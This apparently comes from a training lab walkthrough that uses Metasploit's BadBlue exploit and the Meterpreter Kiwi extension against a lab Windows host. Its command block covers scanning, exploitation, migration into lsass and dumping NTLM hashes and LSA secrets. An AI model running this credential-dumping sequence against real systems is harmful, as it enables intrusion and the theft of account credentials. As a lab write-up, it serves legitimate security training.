# Windows: Meterpreter: Kiwi Extension

[Home](../README.md) · [Section index](README.md)

> Adapted from the original notes, lines 2665–2707. Examples are lab-specific and need verification.

The Meterpreter Kiwi plugin is an advanced post-exploitation tool within the Metasploit Framework, specifically designed for interacting with and extracting sensitive data from compromised Windows systems. Kiwi is an extension of the Meterpreter payload and incorporates features from Mimikatz, a well-known post-exploitation tool used for extracting passwords, hashes, and other credentials from Windows systems. In this lab, we will explore the meterpreter Kiwi plugin to extract sensitive data from the target machine.

In this lab environment, you will be provided with GUI access to a Kali machine and a target Windows machine. The target machine running a vulnerable application will be accessible at **demo.ine.local**.

Your task is to fingerprint the application using the tools available on the Kali machine and then exploit the application using the appropriate Metasploit module. Then, use the meterpreter Kiwi plugin to extract sensitive data from the target's machine.

**Objective:** Exploit the application and find all the flags:

- Find Administrator and Student users NTLM hash.
- Dump LSA secrets to find Syskey

Tools: Nmap , Metasploit Framework

```bash
nmap demo.ine.local
nmap -sV -p 80 demo.ine.local
searchsploit badblue 2.7

msfconsole -q
use exploit/windows/http/badblue_passthru
set RHOSTS demo.ine.local
exploit

ps
pgrep lsass.exe
migrate (number)

or
migrate -N lsass.exe
load kiwi
hashdump              //got Administrator and studnent NTLM hashes
or
creds_all
lsa_dump_sam
lsa_dump_secrets
or
run windows/gather/smart_hashdump   //got syskey
```

In this lab, we exploited a vulnerable application using metasploit to gain shell access on the target and then used the meterpreter Kiwi plugin to extract sensitive data from the target machine.
